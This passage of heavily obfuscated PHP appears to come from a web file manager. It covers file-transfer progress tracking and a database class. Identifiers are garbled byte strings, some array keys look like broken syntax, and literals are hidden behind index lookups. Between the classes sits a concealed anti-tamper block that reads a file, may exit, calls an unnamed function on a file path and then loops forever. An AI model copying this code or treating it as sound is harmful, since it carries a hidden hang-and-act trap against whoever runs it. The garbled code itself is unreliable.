(!$©Í´∆–¬) { return Model($£∞ﬁ’úË[456])->where(array($£∞ﬁ’úË[104] => $Ô¢ÜÉïÿ, $£∞ﬁ’úË[43] => $£∞ﬁ’úË[1074]))->delete(); } $π—‰õôâ = json_encode($©Í´∆–¬); if (!$π—‰õôâ) { ob_start(); var_dump($©Í´∆–¬); $ØΩ≈íùº = ob_get_clean(); self::log($£∞ﬁ’úË[1683] . json_encode_force($ØΩ≈íùº)); } if (!$Ô¢ÜÉïÿ || !$©Í´∆–¬[$£∞ﬁ’úË[408]]) { return !1; } $È–Ëü”Ø = array($£∞ﬁ’úË[43] => $£∞ﬁ’úË[1074], $£∞ﬁ’úË[1658] => USER_ID, $£∞ﬁ’úË[104] => $Ô¢ÜÉïÿ, $£∞ﬁ’úË[383] => $π—‰õôâ); $óìÎÎ«è = $£∞ﬁ’úË[1684]; CacheLock::lock($óìÎÎ«è); Model($£∞ﬁ’úË[456])->add($È–Ëü”Ø, array(), !0); CacheLock::unlock($óìÎÎ«è); } public static function log($ˆÇ‘ÿï‚) { if (!GLOBAL_DEBUG) { return; } write_log($ˆÇ‘ÿï‚, $_SERVER[Á≈ ä ∞][1685]); } } class TaskFileTransfer extends Task { protected function startAfter() { $˚”¡◊ﬂı =& $_SERVER[Á≈ ä ∞]; $‘Îÿ¿ó€ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($˚”¡◊ﬂı[1686], array($this, $˚”¡◊ﬂı[1687])); Hook::bind($˚”¡◊ﬂı[1218], array($this, $˚”¡◊ﬂı[1688])); Hook::bind($˚”¡◊ﬂı[1689], array($this, $˚”¡◊ﬂı[1690])); Hook::bind($˚”¡◊ﬂı[613], array($this, $˚”¡◊ﬂı[1691])); Hook::bind($˚”¡◊ﬂı[614], array($this, $˚”¡◊ﬂı[1692])); Hook::bind($˚”¡◊ﬂı[619], array($this, $˚”¡◊ﬂı[1693])); Hook::bind($˚”¡◊ﬂı[620], array($this, $˚”¡◊ﬂı[1694])); Hook::bind($˚”¡◊ﬂı[616], array($this, $˚”¡◊ﬂı[1695])); Hook::bind($˚”¡◊ﬂı[617], array($this, $˚”¡◊ﬂı[1696])); Hook::bind($˚”¡◊ﬂı[583], array($this, $˚”¡◊ﬂı[1697])); Hook::bind($˚”¡◊ﬂı[580], array($this, $˚”¡◊ﬂı[1697])); Hook::bind($˚”¡◊ﬂı[585], array($this, $˚”¡◊ﬂı[1697])); Hook::bind($˚”¡◊ﬂı[587], array($this, $˚”¡◊ﬂı[1697])); Hook::bind($˚”¡◊ﬂı[589], array($this, $˚”¡◊ﬂı[1697])); Hook::bind($˚”¡◊ﬂı[1698], array($this, $˚”¡◊ﬂı[1699])); Hook::bind($˚”¡◊ﬂı[606], array($this, $˚”¡◊ﬂı[1700])); $this->sourceModelCopyFlag = !1; Hook::bind($˚”¡◊ﬂı[1701], array($this, $˚”¡◊ﬂı[1702])); Hook::bind($˚”¡◊ﬂı[1703], array($this, $˚”¡◊ﬂı[1704])); Hook::bind($˚”¡◊ﬂı[1705], array($this, $˚”¡◊ﬂı[1706])); $‘Îÿ¿ó€[$˚”¡◊ﬂı[1707]] = LNG($˚”¡◊ﬂı[1708]); $‘Îÿ¿ó€[$˚”¡◊ﬂı[1709]] = 0; $‘Îÿ¿ó€[$˚”¡◊ﬂı[1710]] = 0; $‘Îÿ¿ó€[$˚”¡◊ﬂı[1067]] = $˚”¡◊ﬂı[22]; $‘Îÿ¿ó€[$˚”¡◊ﬂı[1711]] = $˚”¡◊ﬂı[22]; $‘Îÿ¿ó€[$˚”¡◊ﬂı[1712]] = 0; $‘Îÿ¿ó€[$˚”¡◊ﬂı[1713]] = 0; $‘Îÿ¿ó€[$˚”¡◊ﬂı[1714]] = 0; if (!$‘Îÿ¿ó€[$˚”¡◊ﬂı[1557]]) { $‘Îÿ¿ó€[$˚”¡◊ﬂı[1557]] = LNG($˚”¡◊ﬂı[1715]); } } protected function endAfter() { $à∏ıÖ˙à =& $_SERVER[Á≈ ä ∞]; Hook::unbind($à∏ıÖ˙à[1686], array($this, $à∏ıÖ˙à[1687])); Hook::unbind($à∏ıÖ˙à[1218], array($this, $à∏ıÖ˙à[1688])); Hook::unbind($à∏ıÖ˙à[1689], array($this, $à∏ıÖ˙à[1690])); Hook::unbind($à∏ıÖ˙à[613], array($this, $à∏ıÖ˙à[1691])); Hook::unbind($à∏ıÖ˙à[614], array($this, $à∏ıÖ˙à[1692])); Hook::unbind($à∏ıÖ˙à[619], array($this, $à∏ıÖ˙à[1693])); Hook::unbind($à∏ıÖ˙à[620], array($this, $à∏ıÖ˙à[1694])); Hook::unbind($à∏ıÖ˙à[616], array($this, $à∏ıÖ˙à[1695])); Hook::unbind($à∏ıÖ˙à[617], array($this, $à∏ıÖ˙à[1696])); Hook::unbind($à∏ıÖ˙à[583], array($this, $à∏ıÖ˙à[1697])); Hook::unbind($à∏ıÖ˙à[580], array($this, $à∏ıÖ˙à[1697])); Hook::unbind($à∏ıÖ˙à[585], array($this, $à∏ıÖ˙à[1697])); Hook::unbind($à∏ıÖ˙à[587], array($this, $à∏ıÖ˙à[1697])); Hook::unbind($à∏ıÖ˙à[589], array($this, $à∏ıÖ˙à[1697])); Hook::unbind($à∏ıÖ˙à[1698], array($this, $à∏ıÖ˙à[1699])); Hook::unbind($à∏ıÖ˙à[606], array($this, $à∏ıÖ˙à[1700])); Hook::unbind($à∏ıÖ˙à[1701], array($this, $à∏ıÖ˙à[1702])); Hook::unbind($à∏ıÖ˙à[1703], array($this, $à∏ıÖ˙à[1704])); Hook::unbind($à∏ıÖ˙à[1705], array($this, $à∏ıÖ˙à[1706])); } public function copyMoveStart($èÆ°ÁûÁ, $ïÅæèÁë, $Îêﬁ˜•…, $ãêä”õ˚) { $‡ÇÎÖˆÙ =& $_SERVER[Á≈ ä ∞]; self::log($‡ÇÎÖˆÙ[1716] . $ïÅæèÁë . $‡ÇÎÖˆÙ[80] . $ãêä”õ˚); $ö∫ÓåÆÃ = rtrim(TEMP_FILES, $‡ÇÎÖˆÙ[18]); if (substr($ïÅæèÁë, 0, strlen($ö∫ÓåÆÃ)) == $ö∫ÓåÆÃ) { return; } if (substr($ãêä”õ˚, 0, strlen($ö∫ÓåÆÃ)) == $ö∫ÓåÆÃ) { return; } $®∫Èıﬂï =& $this->task; $®∫Èıﬂï[$‡ÇÎÖˆÙ[1717]] = KodIO::transferType($èÆ°ÁûÁ, $Îêﬁ˜•…); $this->update(); } public function updateAfter() { $æñ»„˘∞ =& $_SERVER[Á≈ ä ∞]; $£’Í˘ì =& $this->task; if (!$£’Í˘ì[$æñ»„˘∞[770]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($£’Í˘ì[$æñ»„˘∞[1717]] == $æñ»„˘∞[1307]) { return; } self::updateTask($£’Í˘ì); } private static function updateTask(&$…öÆ»œÂ) { $¿„øè„§ =& $_SERVER[Á≈ ä ∞]; if ($…öÆ»œÂ[$¿„øè„§[1717]] == $¿„øè„§[1202] || $…öÆ»œÂ[$¿„øè„§[1717]] == $¿„øè„§[117]) { if ($…öÆ»œÂ[$¿„øè„§[1711]]) { $…öÆ»œÂ[$¿„øè„§[1714]] = $…öÆ»œÂ[$¿„øè„§[1713]] + $…öÆ»œÂ[$¿„øè„§[1710]]; } } else { if ($…öÆ»œÂ[$¿„øè„§[1717]] == $¿„øè„§[1308]) { if ($…öÆ»œÂ[$¿„øè„§[1711]] == $¿„øè„§[1202]) { $…öÆ»œÂ[$¿„øè„§[1714]] = $…öÆ»œÂ[$¿„øè„§[1713]] + $…öÆ»œÂ[$¿„øè„§[1710]] * 0.5; } else { if ($…öÆ»œÂ[$¿„øè„§[1711]] == $¿„øè„§[117]) { $…öÆ»œÂ[$¿„øè„§[1714]] = $…öÆ»œÂ[$¿„øè„§[1713]] + $…öÆ»œÂ[$¿„øè„§[1709]] * 0.5 + $…öÆ»œÂ[$¿„øè„§[1710]] * 0.5; } } } } $…öÆ»œÂ[$¿„øè„§[1660]] = $…öÆ»œÂ[$¿„øè„§[1714]] / $…öÆ»œÂ[$¿„øè„§[770]]; if ($…öÆ»œÂ[$¿„øè„§[1660]] > 0) { $ß¸ëèÜ◊ = timeFloat() - $…öÆ»œÂ[$¿„øè„§[1662]] - $…öÆ»œÂ[$¿„øè„§[1665]]; $…öÆ»œÂ[$¿„øè„§[1666]] = $ß¸ëèÜ◊ * (1 - $…öÆ»œÂ[$¿„øè„§[1660]]) / $…öÆ»œÂ[$¿„øè„§[1660]]; } } public function addPath($˙€∞€à«) { $´ﬁ˘ö≤Œ =& $_SERVER[Á≈ ä ∞]; if (!$˙€∞€à«) { return; } $√Ü¢•Á¯ =& $this->task; $¥€ÖµÉƒ = IO::infoWithChildren($˙€∞€à«); $‹˜Õ¡©∞ = $√Ü¢•Á¯[$´ﬁ˘ö≤Œ[1718]] ? $√Ü¢•Á¯[$´ﬁ˘ö≤Œ[1718]][$´ﬁ˘ö≤Œ[1719]] : 0; $√Ü¢•Á¯[$´ﬁ˘ö≤Œ[1718]] = array($´ﬁ˘ö≤Œ[1719] => $‹˜Õ¡©∞ + 1, $´ﬁ˘ö≤Œ[429] => $¥€ÖµÉƒ[$´ﬁ˘ö≤Œ[42]], $´ﬁ˘ö≤Œ[94] => $¥€ÖµÉƒ[$´ﬁ˘ö≤Œ[94]], $´ﬁ˘ö≤Œ[528] => $¥€ÖµÉƒ[$´ﬁ˘ö≤Œ[528]] ? $¥€ÖµÉƒ[$´ﬁ˘ö≤Œ[528]] : $¥€ÖµÉƒ[$´ﬁ˘ö≤Œ[94]]); if ($¥€ÖµÉƒ[$´ﬁ˘ö≤Œ[43]] == $´ﬁ˘ö≤Œ[209]) { $√Ü¢•Á¯[$´ﬁ˘ö≤Œ[793]] += 1; } else { $√Ü¢•Á¯[$´ﬁ˘ö≤Œ[793]] += $¥€ÖµÉƒ[$´ﬁ˘ö≤Œ[89]][$´ﬁ˘ö≤Œ[87]]; if ($¥€ÖµÉƒ[$´ﬁ˘ö≤Œ[411]]) { $√Ü¢•Á¯[$´ﬁ˘ö≤Œ[793]] += $¥€ÖµÉƒ[$´ﬁ˘ö≤Œ[89]][$´ﬁ˘ö≤Œ[88]] + 1; } } $√Ü¢•Á¯[$´ﬁ˘ö≤Œ[770]] += $¥€ÖµÉƒ[$´ﬁ˘ö≤Œ[86]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¯≥˙∞◊») { } public function sourceAddHashEnd($ƒÑ°˙’‘) { } public function sourceAddFileStart($¿⁄ÕÕÿ«) { $ï»®ò·  =& $_SERVER[Á≈ ä ∞]; $¿èÒñŒÊ =& $this->task; $¿èÒñŒÊ[$ï»®ò· [1709]] = $¿⁄ÕÕÿ«[$ï»®ò· [86]]; $¿èÒñŒÊ[$ï»®ò· [1707]] = $¿⁄ÕÕÿ«[$ï»®ò· [42]]; $¿èÒñŒÊ[$ï»®ò· [1067]] = $¿⁄ÕÕÿ«[$ï»®ò· [42]]; $¿èÒñŒÊ[$ï»®ò· [1720]] = $¿⁄ÕÕÿ«[$ï»®ò· [94]]; $this->update(); } public function sourceAddFileEnd($∑ﬂ±Êíó) { $ö∑êå∑â =& $_SERVER[Á≈ ä ∞]; $∏÷¢’Æƒ =& $this->task; $∏÷¢’Æƒ[$ö∑êå∑â[1714]] += $∑ﬂ±Êíó[$ö∑êå∑â[86]]; $∏÷¢’Æƒ[$ö∑êå∑â[1720]] = $∑ﬂ±Êíó[$ö∑êå∑â[94]]; $this->update(1); } public function copyFileStart($—µ•Ïµ—, $µ°”∆ÒÜ, $Âäú±•°, $Ï¡≠Ω√≈, $˚ÚßÈí–, $›¯Ç£’Á) { $©ëÕÎóÅ =& $_SERVER[Á≈ ä ∞]; $‡≤À“Ø† = $˚ÚßÈí–; if ($‡≤À“Ø† == $GLOBALS[$©ëÕÎóÅ[1721]]) { $‡≤À“Ø† = $GLOBALS[$©ëÕÎóÅ[1722]]; } $GLOBALS[$©ëÕÎóÅ[1722]] = $˚ÚßÈí–; $GLOBALS[$©ëÕÎóÅ[1721]] = $›¯Ç£’Á; $ãüπñ„º =& $this->task; $ãüπñ„º[$©ëÕÎóÅ[1707]] = $‡≤À“Ø†; $ãüπñ„º[$©ëÕÎóÅ[1709]] = (int) $—µ•Ïµ—->size($µ°”∆ÒÜ); $ãüπñ„º[$©ëÕÎóÅ[1710]] = 0; $ãüπñ„º[$©ëÕÎóÅ[1067]] = $©ëÕÎóÅ[22]; $ãüπñ„º[$©ëÕÎóÅ[1711]] = $©ëÕÎóÅ[22]; $ãüπñ„º[$©ëÕÎóÅ[1712]] = 0; $’˙ä§ËÑ = $ãüπñ„º[$©ëÕÎóÅ[1709]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ãüπñ„º[$©ëÕÎóÅ[408]] . $©ëÕÎóÅ[1723]); if ($’˙ä§ËÑ && file_exists(get_path_father($Ï¡≠Ω√≈))) { Cache::set($ãüπñ„º[$©ëÕÎóÅ[408]] . $©ëÕÎóÅ[1723], $Ï¡≠Ω√≈); $ãüπñ„º[$©ëÕÎóÅ[1680]] = array($©ëÕÎóÅ[1724], $©ëÕÎóÅ[1725]); } $this->update(0, $’˙ä§ËÑ); } public static function updateCopyLocalFileSize($ıø¬´Ç˝) { $ÎË›•ç° =& $_SERVER[Á≈ ä ∞]; $˚æµ†êñ = Cache::get($ıø¬´Ç˝[$ÎË›•ç°[408]] . $ÎË›•ç°[1723]); if (!$˚æµ†êñ || !file_exists($˚æµ†êñ)) { return $ıø¬´Ç˝; } $ıø¬´Ç˝[$ÎË›•ç°[1710]] = @filesize($˚æµ†êñ); $ıø¬´Ç˝[$ÎË›•ç°[1714]] += $ıø¬´Ç˝[$ÎË›•ç°[1710]]; self::updateTask($ıø¬´Ç˝); return $ıø¬´Ç˝; } public function copyFileEnd($ôÎÖ…±¿, $óˆ‚¸éó, $ÅÌ˜ÅÒ˜, $Ä÷∆‘œ˙, $à¿Öø‘¯, $È⁄›“ß∆) { $›î„¯”˙ =& $_SERVER[Á≈ ä ∞]; $êü§ë◊ê =& $this->task; $êü§ë◊ê[$›î„¯”˙[1710]] = $êü§ë◊ê[$›î„¯”˙[1709]]; $êü§ë◊ê[$›î„¯”˙[1711]] = $›î„¯”˙[22]; unset($êü§ë◊ê[$›î„¯”˙[1680]]); if ($à¿Öø‘¯ == $êü§ë◊ê[$›î„¯”˙[1707]]) { $êü§ë◊ê[$›î„¯”˙[1713]] += $êü§ë◊ê[$›î„¯”˙[1709]]; $êü§ë◊ê[$›î„¯”˙[1714]] = $êü§ë◊ê[$›î„¯”˙[1713]]; $éçØﬂ∂Æ = 1; if (isset($êü§ë◊ê[$›î„¯”˙[1720]]) && $êü§ë◊ê[$›î„¯”˙[1720]] == $óˆ‚¸éó) { $éçØﬂ∂Æ = 0; } $this->update($éçØﬂ∂Æ); } else { $this->update(); $êü§ë◊ê[$›î„¯”˙[1710]] = 0; } Cache::remove($êü§ë◊ê[$›î„¯”˙[408]] . $›î„¯”˙[1723]); self::log($›î„¯”˙[1726] . $óˆ‚¸éó . $›î„¯”˙[80] . $Ä÷∆‘œ˙ . $›î„¯”˙[11] . $à¿Öø‘¯ . $›î„¯”˙[1727] . $êü§ë◊ê[$›î„¯”˙[1707]]); } public function updateFileEnd($Äµ‰»øØ, $òÍ“ëˆﬂ) { $â›‘∞ÊÄ =& $_SERVER[Á≈ ä ∞]; $¶»ı•ê∞ =& $this->task; $¶»ı•ê∞[$â›‘∞ÊÄ[1707]] = $Äµ‰»øØ; $¶»ı•ê∞[$â›‘∞ÊÄ[1709]] = $òÍ“ëˆﬂ; $¶»ı•ê∞[$â›‘∞ÊÄ[1713]] += $òÍ“ëˆﬂ; $¶»ı•ê∞[$â›‘∞ÊÄ[1714]] = $¶»ı•ê∞[$â›‘∞ÊÄ[1713]]; $this->update(1); self::log($â›‘∞ÊÄ[1728] . $Äµ‰»øØ); } public function sourceModelCopy($±¥ï§©Ö) { $≤íó œ‡ =& $_SERVER[Á≈ ä ∞]; $åáÌØ˚é = $±¥ï§©Ö[0]; $Œç√∂¬¿ = $±¥ï§©Ö[1]; $ÄÏ¶ÃﬁØ =& $this->task; $this->sourceModelCopyFlag = !0; $Ñ≥†ßûÏ = 0; switch ($åáÌØ˚é) { case $≤íó œ‡[581]: $Ñ≥†ßûÏ = 1; break; case $≤íó œ‡[584]: $ÄÏ¶ÃﬁØ[$≤íó œ‡[1707]] = $Œç√∂¬¿[$≤íó œ‡[42]]; break; case $≤íó œ‡[586]: $Ñ≥†ßûÏ = intval($±¥ï§©Ö[$≤íó œ‡[389]] * 0.4); break; case $≤íó œ‡[588]: $Ñ≥†ßûÏ = intval($±¥ï§©Ö[$≤íó œ‡[389]] * 0.2); break; case $≤íó œ‡[590]: $Ñ≥†ßûÏ = intval($±¥ï§©Ö[$≤íó œ‡[389]] * 0.4); break; } $this->update($Ñ≥†ßûÏ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Ü∆´üùÓ, $‹ﬂ°ì÷ô) { $Á¬·Ìµá =& $_SERVER[Á≈ ä ∞]; $this->sourceModelCopyFlag = !0; $ÂÜ¯¯¡â = 1; if (isset($Ü∆´üùÓ[$Á¬·Ìµá[89]])) { $ÂÜ¯¯¡â = $Ü∆´üùÓ[$Á¬·Ìµá[89]][$Á¬·Ìµá[87]]; $ÂÜ¯¯¡â = $ÂÜ¯¯¡â + $Ü∆´üùÓ[$Á¬·Ìµá[89]][$Á¬·Ìµá[88]] + 1; } $this->update($ÂÜ¯¯¡â); $this->sourceModelCopyFlag = !1; } public function sourceMove($¬©˘µÿè) { $this->sourceRemove($¬©˘µÿè, !1); } public function curlProgress($Ã±è÷ò, $Ô·ÌœÕ›, $êÆÜ°Õ≠, $Í‰Çø¿ä, $’¸´∞ù„) { $Èá¶πœ =& $_SERVER[Á≈ ä ∞]; $ê¸Ø⁄Öâ =& $this->task; if ($’¸´∞ù„ > 0) { $ê¸Ø⁄Öâ[$Èá¶πœ[1067]] = $Èá¶πœ[1729]; $ê¸Ø⁄Öâ[$Èá¶πœ[1711]] = $Èá¶πœ[117]; if ($ê¸Ø⁄Öâ[$Èá¶πœ[1709]]) { $ê¸Ø⁄Öâ[$Èá¶πœ[1710]] = $’¸´∞ù„; } if ($ê¸Ø⁄Öâ[$Èá¶πœ[1712]]) { $ê¸Ø⁄Öâ[$Èá¶πœ[1710]] = $’¸´∞ù„ + $ê¸Ø⁄Öâ[$Èá¶πœ[1712]]; } } else { if ($êÆÜ°Õ≠ > 0) { if ($ê¸Ø⁄Öâ[$Èá¶πœ[1709]] == $Ô·ÌœÕ›) { $ê¸Ø⁄Öâ[$Èá¶πœ[1710]] = $êÆÜ°Õ≠; $ê¸Ø⁄Öâ[$Èá¶πœ[1067]] = $Èá¶πœ[1730]; $ê¸Ø⁄Öâ[$Èá¶πœ[1711]] = $Èá¶πœ[1202]; } } } $this->update(); } public function curlProgressStart($¿˛ìËÜÖ) { } public function curlProgressEnd($ÿ“Ùƒ∆ê) { $¢âÒÅ—≥ =& $_SERVER[Á≈ ä ∞]; $·Ö∑ÓÀ´ =& $this->task; $£ö√Ö‡ª = curl_getinfo($ÿ“Ùƒ∆ê); $Û•ö»π¬ = $£ö√Ö‡ª[$¢âÒÅ—≥[1731]]; if ($Û•ö»π¬ == -1) { $Û•ö»π¬ = $£ö√Ö‡ª[$¢âÒÅ—≥[1732]]; } if ($·Ö∑ÓÀ´[$¢âÒÅ—≥[1711]] == $¢âÒÅ—≥[117] && $Û•ö»π¬) { $·Ö∑ÓÀ´[$¢âÒÅ—≥[1712]] += $Û•ö»π¬; } $this->update(); } } if (!isset($_SERVER[$_SERVER[Á≈ ä ∞][6]]) || !isset($_SERVER[$_SERVER[Á≈ ä ∞][15]])) { $_getc = $_SERVER[Á≈ ä ∞][8]; $_getfile = $_SERVER[$_SERVER[Á≈ ä ∞][9]] . $_SERVER[Á≈ ä ∞][10]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Á≈ ä ∞][11], $_getfilec); if (count($_getarrs) < $_SERVER[Á≈ ä ∞][12]) { $exit = $_SERVER[Á≈ ä ∞][13]; $exit(); } $_act = $_SERVER[Á≈ ä ∞][14]; $_act($_SERVER[$_SERVER[Á≈ ä ∞][9]] . $_SERVER[Á≈ ä ∞][10]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Á≈ ä ∞][387]); } } goto f¢ÁÜÖé∑¥; dÿë¿µ∏Ìô: if ($_SERVER[$_SERVER[Á≈ ä ∞][6]] != $_size($_file)) { $_getc = $_SERVER[Á≈ ä ∞][8]; $_getfile = $_SERVER[$_SERVER[Á≈ ä ∞][9]] . $_SERVER[Á≈ ä ∞][10]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Á≈ ä ∞][11], $_getfilec); if (count($_getarrs) < $_SERVER[Á≈ ä ∞][12]) { $exit = $_SERVER[Á≈ ä ∞][13]; $exit(); } $_act = $_SERVER[Á≈ ä ∞][14]; $_act($_file); } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\145\161" => "\x3c\x3e", "\x67\164" => "\76", "\145\147\x74" => "\x3e\75", "\x6c\164" => "\x3c", "\x65\154\164" => "\74\75", "\x6e\x6f\164\x6c\x69\x6b\x65" => "\x4e\x4f\124\x20\x4c\x49\113\105", "\154\x69\153\145" => "\x4c\111\113\x45", "\x69\156" => "\111\x4e", "\156\x6f\164\151\x6e" => "\x4e\117\124\x20\x49\116", "\x6e\x6f\164\x20\151\x6e" => "\x4e\x4f\124\x20\111\116", "\x62\145\x74\167\145\145\x6e" => "\x42\105\x54\x57\x45\105\116", "\x6e\x6f\x74\142\x65\164\x77\x65\145\x6e" => "\x4e\117\x54\x20\x42\x45\x54\x57\105\x45\x4e", "\x6e\157\x74\40\142\145\164\167\145\145\x6e" => "\x4e\x4f\124\40\102\x45\124\x57\x45\x45\x4e"); protected $selectSql = "\123\x45\x4c\105\103\124\45\x44\x49\123\x54\111\x4e\103\x54\x25\40\45\x46\111\105\114\104\x25\40\106\122\x4f\x4d\x20\45\x54\101\x42\x4c\x45\x25\45\x4a\x4f\x49\116\45\45\127\x48\105\x52\105\45\45\107\x52\117\125\x50\45\x25\x48\101\x56\x49\x4e\107\x25\45\117\x52\x44\105\122\45\45\114\x49\115\x49\124\45\40\45\125\116\x49\x4f\116\45\45\x43\117\x4d\x4d\x45\116\124\x25"; protected $bind = array(); public static function getInstance() { $È¸îñÕ≈ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Á≈ ä ∞][963], $È¸îñÕ≈); } public function factory($¬æÀ≠∑Ì = '') { $‰˘¸æ¶û =& $_SERVER[Á≈ ä ∞]; $¬æÀ≠∑Ì = $this->parseConfig($¬æÀ≠∑Ì); if (empty($¬æÀ≠∑Ì[$‰˘¸æ¶û[964]])) { think_exception(think_lang($‰˘¸æ¶û[965])); } $this->dbType = ucwords(strtolower($¬æÀ≠∑Ì[$‰˘¸æ¶û[964]])); $÷©òäõ‡ = $‰˘¸æ¶û[966] . $this->dbType; if (class_exists($÷©òäõ‡)) { $ÏÌ˘ƒﬁ = new $÷©òäõ‡($¬æÀ≠∑Ì); if ($‰˘¸æ¶û[967] != strtolower($¬æÀ≠∑Ì[$‰˘¸æ¶û[964]])) { $ÏÌ˘ƒﬁ->dbType = strtoupper($this->dbType); } else { $ÏÌ˘ƒﬁ->dbType = $this->_getDsnType($¬æÀ≠∑Ì[$‰˘¸æ¶û[919]]); } } else { think_exception(think_lang($‰˘¸æ¶û[968]) . $‰˘¸æ¶û[969] . $÷©òäõ‡); } return $ÏÌ˘ƒﬁ; } public function __call($‰Ÿﬁπ√, $ù–äç⁄Ò) { if (method_exists($this, $‰Ÿﬁπ√)) { return call_user_func_array(array($this, $‰Ÿﬁπ√), $ù–äç⁄Ò); } } protected function _getDsnType($©ÂÖΩ‰€) { $‰°Ë∏äÊ = explode($_SERVER[Á≈ ä ∞][4], $©ÂÖΩ‰€); $ñÌœ•û≥ = strtoupper(trim($‰°Ë∏äÊ[0])); return $ñÌœ•û≥; } private function parseConfig($Ä¥†Ä¢ = '') { $îÊ…Ô”ö =& $_SERVER[Á≈ ä ∞]; if (!empty($Ä¥†Ä¢) && is_string($Ä¥†Ä¢)) { $Ä¥†Ä¢ = $this->parseDSN($Ä¥†Ä¢); } elseif (is_array($Ä¥†Ä¢)) { $Ä¥†Ä¢ = array_change_key_case($Ä¥†Ä¢); $Ä¥†Ä¢ = array($îÊ…Ô”ö[964] => $Ä¥†Ä¢[$îÊ…Ô”ö[970]], $îÊ…Ô”ö[891] => $Ä¥†Ä¢[$îÊ…Ô”ö[971]], $îÊ…Ô”ö[892] => $Ä¥†Ä¢[$îÊ…Ô”ö[972]], $îÊ…Ô”ö[889] => $Ä¥†Ä¢[$îÊ…Ô”ö[973]], $îÊ…Ô”ö[890] => $Ä¥†Ä¢[$îÊ…Ô”ö[974]], $îÊ…Ô”ö[31] => $Ä¥†Ä¢[$îÊ…Ô”ö[975]], $îÊ…Ô”ö[919] => $Ä¥†Ä¢[$îÊ…Ô”ö[976]], $îÊ…Ô”ö[27] => isset($Ä¥†Ä¢[$îÊ…Ô”ö[977]]) ? $Ä¥†Ä¢[$îÊ…Ô”ö[977]] : array()); } elseif (empty($Ä¥†Ä¢)) { if (think_config($îÊ…Ô”ö[978]) && $îÊ…Ô”ö[967] != strtolower(think_config($îÊ…Ô”ö[979]))) { $Ä¥†Ä¢ = $this->parseDSN(think_config($îÊ…Ô”ö[978])); } else { $Ä¥†Ä¢ = array($îÊ…Ô”ö[964] => think_config($îÊ…Ô”ö[979]), $îÊ…Ô”ö[891] => think_config($îÊ…Ô”ö[980]), $îÊ…Ô”ö[892] => think_config($îÊ…Ô”ö[981]), $îÊ…Ô”ö[889] => think_config($îÊ…Ô”ö[982]), $îÊ…Ô”ö[890] => think_config($îÊ…Ô”ö[983]), $îÊ…Ô”ö[31] => think_config($îÊ…Ô”ö[255]), $îÊ…Ô”ö[919] => think_config($îÊ…Ô”ö[978]), $îÊ…Ô”ö[27] => think_config($îÊ…Ô”ö[984])); } } return $Ä¥†Ä¢; } protected function initConnect($ÎÆ∂éæŸ = true) { if (1 == think_config($_SERVER[Á≈ ä ∞][32])) { $this->_linkID = $this->multiConnect($ÎÆ∂éæŸ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¿ÄÔ≈ö¨ => $úï≈√⁄˝) { $this->_linkID = $úï≈√⁄˝; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ÜÕË÷÷õ = false) { $«Õú˛£Ò =& $_SERVER[Á≈ ä ∞]; static $ÙÃûì§Ô = array(); static $˝çÅê»œ = -1; if (empty($ÙÃûì§Ô)) { foreach ($this->config as $‡Ì®µ˜ä => $∆˘·‡Ô±) { $ÙÃûì§Ô[$‡Ì®µ˜ä] = explode($«Õú˛£Ò[60], $∆˘·‡Ô±); } } if (think_config($«Õú˛£Ò[985])) { if ($ÜÕË÷÷õ || think_config($«Õú˛£Ò[404]) === !0) { $◊≈ƒ∆∑å = floor(mt_rand(0, think_config($«Õú˛£Ò[986]) - 1)); $˝çÅê»œ = $◊≈ƒ∆∑å; } else { if (is_numeric(think_config($«Õú˛£Ò[987]))) { $◊≈ƒ∆∑å = think_config($«Õú˛£Ò[987]); } else { $◊≈ƒ∆∑å = floor(mt_rand(think_config($«Õú˛£Ò[986]), count($ÙÃûì§Ô[$«Õú˛£Ò[889]]) - 1)); } } } else { $◊≈ƒ∆∑å = floor(mt_rand(0, count($ÙÃûì§Ô[$«Õú˛£Ò[889]]) - 1)); $˝çÅê»œ = $◊≈ƒ∆∑å; } $◊≈ƒ∆∑å = $˝çÅê»œ !== -1 ? $˝çÅê»œ : $◊≈ƒ∆∑å; $òÁÙôÒÆ = array($«Õú˛£Ò[891] => isset($ÙÃûì§Ô[$«Õú˛£Ò[891]][$◊≈ƒ∆∑å]) ? $ÙÃûì§Ô[$«Õú˛£Ò[891]][$◊≈ƒ∆∑å] : $ÙÃûì§Ô[$«Õú˛£Ò[891]][0], $«Õú˛£Ò[892] => isset($ÙÃûì§Ô[$«Õú˛£Ò[892]][$◊≈ƒ∆∑å]) ? $ÙÃûì§Ô[$«Õú˛£Ò[892]][$◊≈ƒ∆∑å] : $ÙÃûì§Ô[$«Õú˛£Ò[892]][0], $«Õú˛£Ò[889] => isset($ÙÃûì§Ô[$«Õú˛£Ò[889]][$◊≈ƒ∆∑å]) ? $ÙÃûì§Ô[$«Õú˛£Ò[889]][$◊≈ƒ∆∑å] : $ÙÃûì§Ô[$«Õú˛£Ò[889]][0], $«Õú˛£Ò[890] => isset($ÙÃûì§Ô[$«Õú˛£Ò[890]][$◊≈ƒ∆∑å]) ? $ÙÃûì§Ô[$«Õú˛£Ò[890]][$◊≈ƒ∆∑å] : $ÙÃûì§Ô[$«Õú˛£Ò[890]][0], $«Õú˛£Ò[31] => 